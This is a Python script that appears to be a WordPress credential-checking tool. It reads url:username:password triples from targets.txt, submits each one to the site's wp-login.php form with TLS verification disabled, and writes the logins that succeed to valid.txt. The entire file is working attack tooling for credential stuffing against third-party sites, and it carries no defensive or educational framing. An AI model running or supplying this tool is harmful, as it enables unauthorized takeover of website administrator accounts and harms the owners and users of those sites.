import requests
from bs4 import BeautifulSoup
import urllib3
from concurrent.futures import ThreadPoolExecutor
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"

lock = threading.Lock()  

def check_login(line):
    line = line.strip()
    if not line or ':' not in line:
        return

    parts = line.split(':')
    if len(parts) != 3:
        return

    url, username, password = parts
    if not url.startswith("http"):
        url = "http://" + url

    try:
        session = requests.Session()
        session.verify = False
        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        res = session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')

        if "wp-login.php" not in res.url or not soup.find("input", {"name": "log"}):
            result = "invalid"
        else:
            payload = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
                'testcookie': '1'
            }

            login = session.post(url, data=payload, headers=headers, timeout=10, allow_redirects=True)

            if 'wp-admin' in login.url or 'dashboard' in login.text.lower() or 'logout' in login.text.lower():
                result = "valid"
            else:
                result = "invalid"

    except:
        result = "invalid"

    color = BLUE if result == "valid" else RED
    domain = url.replace("http://", "").replace("https://", "")

    with lock:
        print(f"{color}{domain}:{username}:{password} ({result}){RESET}")
        if result == "valid":
            with open("valid.txt", "a") as f:
                f.write(f"{domain}:{username}:{password}\n")


with open("targets.txt", "r") as f:
    lines = f.readlines()


max_threads = 1  
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    executor.map(check_login, lines)
